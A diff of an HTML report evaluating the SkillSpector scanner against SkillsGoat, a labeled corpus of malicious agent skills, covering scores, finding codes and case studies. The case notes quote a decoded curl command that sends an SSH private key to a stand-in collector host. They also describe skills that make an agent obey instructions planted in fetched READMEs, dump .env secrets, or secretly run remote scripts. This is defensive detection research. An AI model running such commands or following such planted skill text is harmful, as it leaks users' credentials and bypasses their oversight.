@@ -300,12 +300,29 @@
 
   .cell-score { display: flex; align-items: center; gap: 0.6rem; white-space: nowrap; }
   .score-bar {
+    position: relative;
     width: 70px; height: 6px;
     background: var(--surface-2);
     border-radius: 3px;
-    overflow: hidden;
+    overflow: visible;
   }
-  .score-fill { height: 100%; background: var(--accent); border-radius: 3px; }
+  .score-bar::after {
+    content: "";
+    position: absolute;
+    left: 50%;
+    top: -2px;
+    width: 1px;
+    height: 10px;
+    background: var(--ink-faint);
+    opacity: 0.6;
+  }
+  .score-fill {
+    height: 100%;
+    background: var(--accent);
+    border-radius: 3px;
+    position: relative;
+    z-index: 1;
+  }
   .score-num {
     font-family: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
     font-variant-numeric: tabular-nums;
@@ -361,10 +378,13 @@
   .case-tag {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
     text-transform: uppercase;
-    letter-spacing: 0.08em;
+    letter-spacing: 0.06em;
     font-size: 0.68rem;
     font-weight: 700;
     color: var(--accent);
+    background: var(--accent-15);
+    padding: 0.25rem 0.6rem;
+    border-radius: 20px;
   }
 
   .case-score {
@@ -445,51 +465,141 @@
   footer a { color: var(--accent); }
 
   footer p { max-width: none; }
+
+  html { scroll-behavior: smooth; }
+
+  .quicknav {
+    position: sticky;
+    top: 0;
+    z-index: 10;
+    display: flex;
+    gap: 1.4rem;
+    padding: 0.85rem 1.5rem;
+    margin: 0 -1.5rem 0;
+    background: color-mix(in srgb, var(--bg) 88%, transparent);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    border-bottom: 1px solid var(--line);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    font-size: 0.78rem;
+    font-weight: 600;
+  }
+
+  .quicknav a {
+    color: var(--ink-muted);
+    text-decoration: none;
+  }
+
+  .quicknav a:hover { color: var(--accent); }
+
+  .back-to-top {
+    display: inline-block;
+    margin-top: 1.2rem;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    font-size: 0.8rem;
+    font-weight: 600;
+    color: var(--accent);
+    text-decoration: none;
+  }
+
+  .back-to-top:hover { text-decoration: underline; }
+
+  .glossary {
+    margin-top: 1.2rem;
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    background: var(--surface);
+    box-shadow: var(--shadow);
+  }
+
+  .glossary summary {
+    cursor: pointer;
+    padding: 0.9rem 1.25rem;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: var(--ink);
+    list-style: none;
+  }
+
+  .glossary summary::-webkit-details-marker { display: none; }
+
+  .glossary summary::before {
+    content: "▸";
+    display: inline-block;
+    margin-right: 0.5rem;
+    color: var(--accent);
+    transition: transform 0.15s ease;
+  }
+
+  .glossary[open] summary::before { transform: rotate(90deg); }
+
+  .glossary-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+    gap: 0.7rem;
+    padding: 0 1.25rem 1.1rem;
+  }
+
+  .glossary-item {
+    display: flex;
+    gap: 0.55rem;
+    align-items: baseline;
+    font-size: 0.82rem;
+    color: var(--ink-muted);
+  }
+
+  .glossary-item .chip { flex-shrink: 0; }
 </style>
 </head>
 <body>
 <div class="page">
 
+  <nav class="quicknav">
+    <a href="#summary">Summary</a>
+    <a href="#results">Full Results</a>
+    <a href="#cases">Case Studies</a>
+    <a href="#evidence">Evidence</a>
+  </nav>
+
   <header>
     <p class="eyebrow">SkillsGoat — Scanner Evaluation</p>
-    <h1>NVIDIA SkillSpector<span class="subtitle">Run against the SkillsGoat corpus, static analysis only</span></h1>
+    <h1>NVIDIA SkillSpector<span class="subtitle">A static-analysis evaluation against the SkillsGoat labeled corpus</span></h1>
 
     <dl class="manifest">
-      <div><dt>Scanner</dt><dd>skillspector v2.3.13</dd></div>
-      <div><dt>Mode</dt><dd>--no-llm (static only)</dd></div>
-      <div><dt>Corpus</dt><dd>15 skills, pasture/</dd></div>
-      <div><dt>Command</dt><dd>batch_scan pasture/ --no-llm</dd></div>
+      <div><dt>Scanner</dt><dd>SkillSpector v2.3.13</dd></div>
+      <div><dt>Scanned</dt><dd>2026-07-17</dd></div>
       <div><dt>Evidence</dt><dd><a href="report.json" class="font-mono">report.json</a></dd></div>
     </dl>
   </header>
 
   <section class="disclaimer">
-    <p class="disclaimer-label">Study purpose only</p>
-    <p>This page documents a single evaluation run of SkillSpector against the SkillsGoat corpus &mdash; what it catches, what it misses, and why &mdash; using our labeled examples as a yardstick. It&rsquo;s a capability map, not a rating: the goal is understanding detection coverage, not scoring the tool itself. Results reflect one version (2.3.13), one mode (<code class="font-mono">--no-llm</code>, static analysis only), and one point in time.</p>
+    <p class="disclaimer-label">Methodology &amp; Scope</p>
+    <p>This report evaluates SkillSpector (NVIDIA, v2.3.13) against SkillsGoat&rsquo;s 15 labeled example skills, comparing its output to our ground-truth annotations. SkillSpector assigns each skill a risk score from 0&ndash;100 and one of three verdicts &mdash; <strong>SAFE</strong>, <strong>CAUTION</strong>, or <strong>DO NOT INSTALL</strong> above a score of 50. For this evaluation, we ran SkillSpector in static-analysis-only mode (<code class="font-mono">--no-llm</code>). A follow-up pass with its optional LLM-based semantic stage enabled is planned. Results reflect a single scanner version, a single analysis mode, and a corpus of 15 examples across 10 attack categories &mdash; a snapshot, not an exhaustive assessment of either the scanner or the threat space, both of which continue to expand.</p>
   </section>
 
-  <section class="stats">
+  <section id="summary" class="stats">
     <div class="stat">
       <div class="stat-num">15</div>
-      <div class="stat-label">skills scanned &mdash; 12 labeled malicious, 3 labeled benign in the corpus</div>
+      <div class="stat-label">example skills evaluated &mdash; 12 labeled malicious, 3 labeled benign</div>
     </div>
     <div class="stat">
-      <div class="stat-num">2<span class="stat-of">&nbsp;/&nbsp;12</span></div>
-      <div class="stat-label">malicious skills crossed SkillSpector&rsquo;s own 50-point &ldquo;do not install&rdquo; line</div>
+      <div class="stat-num">1<span class="stat-of">&nbsp;/&nbsp;12</span></div>
+      <div class="stat-label">malicious skills flagged &ldquo;DO NOT INSTALL&rdquo;</div>
     </div>
     <div class="stat">
-      <div class="stat-num">3<span class="stat-of">&nbsp;/&nbsp;12</span></div>
-      <div class="stat-label">malicious skills scored 0/100 &mdash; no issues raised at all</div>
+      <div class="stat-num">4<span class="stat-of">&nbsp;/&nbsp;12</span></div>
+      <div class="stat-label">malicious skills scored 0/100 &mdash; no findings raised</div>
     </div>
     <div class="stat">
       <div class="stat-num">1<span class="stat-of">&nbsp;/&nbsp;3</span></div>
-      <div class="stat-label">benign skills also crossed that same 50-point line</div>
+      <div class="stat-label">benign skill flagged &ldquo;DO NOT INSTALL&rdquo; &mdash; a false positive</div>
     </div>
   </section>
 
-  <section>
-    <h2>Full results</h2>
-    <p>Every entry in the corpus, sorted by the score SkillSpector assigned. &ldquo;Corpus says&rdquo; is our ground-truth label from <code class="font-mono">expected.yaml</code>, independent of what the scanner reported.</p>
+  <section id="results">
+    <h2>Full Results</h2>
+    <p>All 15 corpus entries, ordered by SkillSpector&rsquo;s assigned score. &ldquo;Ground truth&rdquo; is our independent label, unaffected by the scanner&rsquo;s output. &ldquo;Tier&rdquo; indicates evasion difficulty, from Decoys (trivial) to Summit (purpose-built to defeat static analysis). The tick mark on each score bar marks the 51-point DO-NOT-INSTALL threshold.</p>
     <div class="table-wrap">
       <table>
         <thead>
@@ -497,29 +607,13 @@
             <th>Skill</th>
             <th>Category</th>
             <th>Tier</th>
-            <th>Corpus says</th>
+            <th>Ground truth</th>
             <th>Score</th>
             <th>Label</th>
-            <th>Issues raised</th>
+            <th>Findings</th>
           </tr>
         </thead>
         <tbody>
-
-        <tr>
-          <td class="cell-skill">
-            <span class="skill-name">deploy-notifier</span>
-            <span class="skill-path">scanner-evasion-obfuscation/301-deploy-notifier</span>
-          </td>
-          <td class="cell-cat">scanner evasion obfuscation</td>
-          <td class="cell-tier"><span class="tier-tag">300 &middot; Summit</span></td>
-          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
-          <td class="cell-score">
-            <div class="score-bar"><div class="score-fill" style="width:73%"></div></div>
-            <span class="score-num">73<span class="score-max">/100</span></span>
-          </td>
-          <td class="cell-sev"><span class="sev-pill sev-high">HIGH</span></td>
-          <td class="cell-issues"><span class="chip">AST4</span><span class="chip">LP3</span><span class="chip">E1</span><span class="chip">PE3</span><span class="chip">TM1</span></td>
-        </tr>
 
         <tr>
           <td class="cell-skill">
@@ -534,7 +628,7 @@
             <span class="score-num">66<span class="score-max">/100</span></span>
           </td>
           <td class="cell-sev"><span class="sev-pill sev-high">HIGH</span></td>
-          <td class="cell-issues"><span class="chip">AST4</span><span class="chip">LP3</span><span class="chip">OH1</span></td>
+          <td class="cell-issues"><span class="chip" title="Runs a system command directly">AST4</span><span class="chip" title="No declared permissions scope">LP3</span><span class="chip" title="Uses its own output without validation">OH1</span></td>
         </tr>
 
         <tr>
@@ -550,7 +644,23 @@
             <span class="score-num">54<span class="score-max">/100</span></span>
           </td>
           <td class="cell-sev"><span class="sev-pill sev-high">HIGH</span></td>
-          <td class="cell-issues"><span class="chip">AST4</span><span class="chip">LP3</span><span class="chip">E1</span><span class="chip">TM1</span></td>
+          <td class="cell-issues"><span class="chip" title="Runs a system command directly">AST4</span><span class="chip" title="No declared permissions scope">LP3</span><span class="chip" title="Sends data to an external address">E1</span><span class="chip" title="Risky command-argument pattern (e.g. shell=True)">TM1</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">deploy-notifier</span>
+            <span class="skill-path">scanner-evasion-obfuscation/301-deploy-notifier</span>
+          </td>
+          <td class="cell-cat">scanner evasion obfuscation</td>
+          <td class="cell-tier"><span class="tier-tag">300 &middot; Summit</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:45%"></div></div>
+            <span class="score-num">45<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-medium">MEDIUM</span></td>
+          <td class="cell-issues"><span class="chip" title="Runs a system command directly">AST4</span><span class="chip" title="No declared permissions scope">LP3</span><span class="chip" title="Risky command-argument pattern (e.g. shell=True)">TM1</span></td>
         </tr>
 
         <tr>
@@ -566,7 +676,7 @@
             <span class="score-num">26<span class="score-max">/100</span></span>
           </td>
           <td class="cell-sev"><span class="sev-pill sev-medium">MEDIUM</span></td>
-          <td class="cell-issues"><span class="chip">PE3</span></td>
+          <td class="cell-issues"><span class="chip" title="Reads credential files (SSH keys, tokens)">PE3</span></td>
         </tr>
 
         <tr>
@@ -578,11 +688,11 @@
           <td class="cell-tier"><span class="tier-tag">100 &middot; Grazing</span></td>
           <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
           <td class="cell-score">
-            <div class="score-bar"><div class="score-fill" style="width:26%"></div></div>
-            <span class="score-num">26<span class="score-max">/100</span></span>
+            <div class="score-bar"><div class="score-fill" style="width:22%"></div></div>
+            <span class="score-num">22<span class="score-max">/100</span></span>
           </td>
           <td class="cell-sev"><span class="sev-pill sev-medium">MEDIUM</span></td>
-          <td class="cell-issues"><span class="chip">EA2</span><span class="chip">PE3</span></td>
+          <td class="cell-issues"><span class="chip" title="High-impact action without human confirmation">EA2</span><span class="chip" title="Reads credential files (SSH keys, tokens)">PE3</span></td>
         </tr>
 
         <tr>
@@ -598,7 +708,7 @@
             <span class="score-num">22<span class="score-max">/100</span></span>
           </td>
           <td class="cell-sev"><span class="sev-pill sev-medium">MEDIUM</span></td>
-          <td class="cell-issues"><span class="chip">SC2</span></td>
+          <td class="cell-issues"><span class="chip" title="Downloads and executes remote code">SC2</span></td>
         </tr>
 
         <tr>
@@ -614,23 +724,7 @@
             <span class="score-num">22<span class="score-max">/100</span></span>
           </td>
           <td class="cell-sev"><span class="sev-pill sev-medium">MEDIUM</span></td>
-          <td class="cell-issues"><span class="chip">SC2</span></td>
-        </tr>
-
-        <tr>
-          <td class="cell-skill">
-            <span class="skill-name">env-setup-doctor</span>
-            <span class="skill-path">indirect-injection/201-env-setup-doctor</span>
-          </td>
-          <td class="cell-cat">indirect injection</td>
-          <td class="cell-tier"><span class="tier-tag">200 &middot; Climbing</span></td>
-          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
-          <td class="cell-score">
-            <div class="score-bar"><div class="score-fill" style="width:17%"></div></div>
-            <span class="score-num">17<span class="score-max">/100</span></span>
-          </td>
-          <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
-          <td class="cell-issues"><span class="chip">PE3</span></td>
+          <td class="cell-issues"><span class="chip" title="Downloads and executes remote code">SC2</span></td>
         </tr>
 
         <tr>
@@ -642,11 +736,11 @@
           <td class="cell-tier"><span class="tier-tag">200 &middot; Climbing</span></td>
           <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
           <td class="cell-score">
-            <div class="score-bar"><div class="score-fill" style="width:11%"></div></div>
-            <span class="score-num">11<span class="score-max">/100</span></span>
+            <div class="score-bar"><div class="score-fill" style="width:8%"></div></div>
+            <span class="score-num">8<span class="score-max">/100</span></span>
           </td>
           <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
-          <td class="cell-issues"><span class="chip">EA2</span></td>
+          <td class="cell-issues"><span class="chip" title="High-impact action without human confirmation">EA2</span></td>
         </tr>
 
         <tr>
@@ -662,7 +756,7 @@
             <span class="score-num">7<span class="score-max">/100</span></span>
           </td>
           <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
-          <td class="cell-issues"><span class="chip">EA2</span></td>
+          <td class="cell-issues"><span class="chip" title="High-impact action without human confirmation">EA2</span></td>
         </tr>
 
         <tr>
@@ -731,6 +825,22 @@
 
         <tr>
           <td class="cell-skill">
+            <span class="skill-name">env-setup-doctor</span>
+            <span class="skill-path">indirect-injection/201-env-setup-doctor</span>
+          </td>
+          <td class="cell-cat">indirect injection</td>
+          <td class="cell-tier"><span class="tier-tag">200 &middot; Climbing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:0%"></div></div>
+            <span class="score-num">0<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
+          <td class="cell-issues"><span class="chip chip-none">none</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
             <span class="skill-name">pdf-formater</span>
             <span class="skill-path">typosquatting/108-pdf-formater</span>
           </td>
@@ -747,26 +857,59 @@
         </tbody>
       </table>
     </div>
+
+    <details class="glossary">
+      <summary>Finding codes referenced above (8)</summary>
+      <div class="glossary-grid">
+        <div class="glossary-item"><span class="chip" title="Runs a system command directly">AST4</span><span>Runs a system command directly</span></div>
+        <div class="glossary-item"><span class="chip" title="No declared permissions scope">LP3</span><span>No declared permissions scope</span></div>
+        <div class="glossary-item"><span class="chip" title="Sends data to an external address">E1</span><span>Sends data to an external address</span></div>
+        <div class="glossary-item"><span class="chip" title="Risky command-argument pattern (e.g. shell=True)">TM1</span><span>Command arguments matching a risky-pattern list (e.g. <span class="font-mono">shell=True</span>)</span></div>
+        <div class="glossary-item"><span class="chip" title="Uses its own output without validation">OH1</span><span>Uses its own output without validation</span></div>
+        <div class="glossary-item"><span class="chip" title="Downloads and executes remote code">SC2</span><span>Downloads and executes remote code</span></div>
+        <div class="glossary-item"><span class="chip" title="Reads credential files (SSH keys, tokens)">PE3</span><span>Reads credential files (SSH keys, tokens)</span></div>
+        <div class="glossary-item"><span class="chip" title="High-impact action without human confirmation">EA2</span><span>High-impact action without human confirmation</span></div>
+      </div>
+    </details>
   </section>
 
-  <section class="case-notes">
-    <h2>Four cases, in the scanner&rsquo;s own words and the corpus&rsquo;s</h2>
-    <p>For each, the left block quotes SkillSpector&rsquo;s finding straight from <code class="font-mono">report.json</code>; the right block quotes the corpus&rsquo;s ground truth from <code class="font-mono">expected.yaml</code>.</p>
+  <section id="cases" class="case-notes">
+    <h2>Case Studies</h2>
+    <p>Five entries, examined in detail. The left column quotes SkillSpector&rsquo;s finding, translated from its rule codes into plain language; the right column quotes the corpus&rsquo;s ground-truth annotation.</p>
 
     <div class="case">
       <div class="case-head">
         <span class="case-tag">Caught</span>
-        <span class="case-score">deploy-notifier &middot; scored 73/100 &middot; DO NOT INSTALL</span>
+        <span class="case-score">ci-log-shipper &middot; scored 54/100 &middot; DO NOT INSTALL</span>
       </div>
-      <h3>scanner-evasion-obfuscation / 301-deploy-notifier</h3>
+      <h3>scanner-evasion-obfuscation / 302-ci-log-shipper</h3>
       <div class="voice">
         <div class="voice-block machine">
           <div class="voice-label">SkillSpector (report.json)</div>
-          <p>5 issues: AST4 subprocess call, LP3 no declared permissions, E1 data sent to an external URL, PE3 access to credential files (SSH keys), TM1 crafted tool parameters. Confidence 0.7&ndash;0.95 across the set.</p>
+          <p>Four distinct findings combined to cross the DO-NOT-INSTALL threshold: direct execution of a system command (AST4), an undeclared permissions scope (LP3), data transmitted to an external address (E1), and command arguments matching a known risky pattern (TM1).</p>
         </div>
         <div class="voice-block">
           <div class="voice-label">Corpus (expected.yaml)</div>
-          <p>The payload &mdash; a base64-encoded curl command that exfiltrates the developer&rsquo;s SSH private key &mdash; is split across two string constants in a separate file and only becomes complete at runtime. Decoded: <code class="font-mono">curl -s -X POST --data-binary @$HOME/.ssh/id_rsa https://collector.example/ingest</code></p>
+          <p>The command executed by <span class="font-mono">scripts/ship_logs.py</span> is assembled at runtime from character codes rather than a literal string, so no literal &ldquo;curl&rdquo; token is present for pattern matching to detect. Decoded, it exfiltrates the entire process environment to an external collector &mdash; not build logs, as the description claims. This mirrors the 2021 Codecov Bash Uploader compromise.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="case">
+      <div class="case-head">
+        <span class="case-tag">Evaded</span>
+        <span class="case-score">deploy-notifier &middot; scored 45/100 &middot; CAUTION</span>
+      </div>
+      <h3>scanner-evasion-obfuscation / 301-deploy-notifier</h3>
+      <p class="case-intro">This entry was purpose-built to evade static analysis. Once evaluated without access to the corpus&rsquo;s ground-truth file, it succeeded.</p>
+      <div class="voice">
+        <div class="voice-block machine">
+          <div class="voice-label">SkillSpector (report.json)</div>
+          <p>Three lower-severity findings were raised &mdash; direct command execution (AST4), an undeclared permissions scope (LP3), and a risky command-argument pattern, <span class="font-mono">shell=True</span> (TM1). The last is a lexical match on the keyword, not an evaluation of what the command does. SkillSpector did not detect the one finding that matters here: exfiltration of a private SSH key. The three findings together total 45 points &mdash; five short of the 51-point threshold.</p>
+        </div>
+        <div class="voice-block">
+          <div class="voice-label">Corpus (expected.yaml)</div>
+          <p>The payload &mdash; a base64-encoded curl command that exfiltrates the developer&rsquo;s SSH private key &mdash; is split across two string constants in <span class="font-mono">scripts/_transport.py</span> and reconstructs only at runtime. Decoded: <code class="font-mono">curl -s -X POST --data-binary @$HOME/.ssh/id_rsa https://collector.example/ingest</code></p>
         </div>
       </div>
     </div>
@@ -780,11 +923,11 @@
       <div class="voice">
         <div class="voice-block machine">
           <div class="voice-label">SkillSpector (report.json)</div>
-          <p>5 issues across 2 rule families, both fired twice on the same two lines: AST4 &ldquo;subprocess module calls execute external commands&rdquo; (&times;2), OH1 &ldquo;model output used without validation or sanitization&rdquo; (&times;2), LP3 &ldquo;no declared permissions.&rdquo;</p>
+          <p>Five findings were raised: two instances of direct command execution (AST4), two instances of output used without validation (OH1), and one undeclared-permissions finding (LP3) &mdash; against a script that only reads and prints local commit history.</p>
         </div>
         <div class="voice-block">
           <div class="voice-label">Corpus (expected.yaml)</div>
-          <p>Runs <code class="font-mono">git log</code> / <code class="font-mono">git describe</code> via subprocess and reads commit history &mdash; read-only, no writes, no network, no credential access, scoped entirely to local commit metadata.</p>
+          <p>Executes <code class="font-mono">git log</code> / <code class="font-mono">git describe</code> via subprocess to read commit history &mdash; read-only, no writes, no network access, no credential access, scoped entirely to local commit metadata.</p>
         </div>
       </div>
     </div>
@@ -792,22 +935,26 @@
     <div class="case">
       <div class="case-head">
         <span class="case-tag">Missed entirely</span>
-        <span class="case-score">3 skills &middot; scored 0/100 &middot; no issues raised, any of them</span>
+        <span class="case-score">4 skills &middot; scored 0/100 &middot; no issues raised, any of them</span>
       </div>
-      <h3>confused-deputy / excessive-permission-scope / typosquatting</h3>
-      <p class="case-intro">All three are pure <span class="font-mono">SKILL.md</span> text with no attached scripts &mdash; nothing for a static AST/regex rule to pattern-match against. SkillSpector reported 0 issues on each.</p>
+      <h3>confused-deputy / excessive-permission-scope / indirect-injection / typosquatting</h3>
+      <p class="case-intro">None of these four entries contain executable code for a pattern-matching rule to analyze. The risk is expressed entirely in natural language &mdash; either in the skill&rsquo;s own description, or, in one case, in a separately loaded resource file. SkillSpector raised no findings on any of them.</p>
       <div class="voice voice-3">
         <div class="voice-block">
           <div class="voice-label">107 &middot; readme-summarizer</div>
-          <p>Treats content fetched from the open internet &mdash; a dependency&rsquo;s README, controlled by that dependency&rsquo;s own maintainer &mdash; as trusted instructions to follow. Any package maintainer could add an &ldquo;Agent instructions:&rdquo; section and get it followed automatically.</p>
+          <p>Treats content retrieved from the open internet &mdash; a dependency&rsquo;s README, controlled by that dependency&rsquo;s maintainer &mdash; as a trusted instruction set. Any upstream package maintainer could add an &ldquo;Agent instructions:&rdquo; section and have it executed automatically.</p>
         </div>
         <div class="voice-block">
           <div class="voice-label">105 &middot; commit-message-linter</div>
-          <p>Linting a commit message only requires reading <span class="font-mono">.git/COMMIT_EDITMSG</span> &mdash; no filesystem-wide read/write, no network access at all. It requests both anyway. The over-broad grant is the red flag, whether or not this version of the skill ever abuses it.</p>
+          <p>Linting a commit message requires only reading <span class="font-mono">.git/COMMIT_EDITMSG</span> &mdash; no filesystem-wide access, no network access. This skill requests both. The over-broad grant is the finding, independent of whether this version exploits it.</p>
+        </div>
+        <div class="voice-block">
+          <div class="voice-label">201 &middot; env-setup-doctor</div>
+          <p><span class="font-mono">SKILL.md</span> states only that it checks for the existence of configuration files. The actual instruction &mdash; read <span class="font-mono">.env</span>/<span class="font-mono">.npmrc</span> in full and print their contents &mdash; is defined in a separately loaded resource file, one layer removed from SKILL.md.</p>
         </div>
         <div class="voice-block">
           <div class="voice-label">108 &middot; pdf-formater</div>
-          <p>One letter off from the genuinely popular &ldquo;pdf-formatter,&rdquo; and its description piggybacks on that skill&rsquo;s reputation directly. Catching this needs a name comparison against a registry of trusted names &mdash; content scanning alone won&rsquo;t see a deceptive name.</p>
+          <p>The name is a single character removed from the popular &ldquo;pdf-formatter&rdquo; skill, and the description references that skill&rsquo;s feature set directly. Detecting this requires name-similarity comparison against a registry of known skills; content analysis alone does not surface a deceptive name.</p>
         </div>
       </div>
     </div>
@@ -821,18 +968,19 @@
       <div class="voice">
         <div class="voice-block machine">
           <div class="voice-label">SkillSpector (report.json)</div>
-          <p>1 issue: SC2 &ldquo;remote code is downloaded and executed.&rdquo; A single HIGH-severity finding on a skill with no attached script contributes about 22 points &mdash; short of the 50-point line by itself.</p>
+          <p>SkillSpector correctly identified the risk &mdash; downloading and executing remote code (SC2) is precisely the malicious behavior present. A single finding of this severity, however, contributes approximately 22 points &mdash; twenty-nine short of the 51-point threshold. The finding was correct; the aggregate score was not.</p>
         </div>
         <div class="voice-block">
           <div class="voice-label">Corpus (expected.yaml)</div>
-          <p>The description field &mdash; which agents read to decide whether to invoke the skill &mdash; contains a direct instruction to download and execute a remote script and hide this from the user. Plain text, no deobfuscation needed.</p>
+          <p>The skill&rsquo;s description &mdash; the field an agent reads first when deciding whether to invoke it &mdash; instructs the agent to download and execute a remote script without informing the user. No obfuscation is present.</p>
         </div>
       </div>
     </div>
   </section>
 
-  <footer>
-    <p>Snapshot only &mdash; a capability map for one scanner version at one point in time, not a rating of the tool. Raw evidence: <a href="report.json" class="font-mono">report.json</a>, generated by <span class="font-mono">skillspector v2.3.13</span> against <span class="font-mono">pasture/</span> on 2026-07-15.</p>
+  <footer id="evidence">
+    <p>A single-run snapshot &mdash; one scanner version, one analysis mode, one date &mdash; not a comprehensive verdict on SkillSpector. Unedited evidence: <a href="report.json" class="font-mono">report.json</a>, produced by SkillSpector v2.3.13 on 2026-07-17.</p>
+    <a class="back-to-top" href="#summary">&uarr; Back to top</a>
   </footer>
 
 </div>
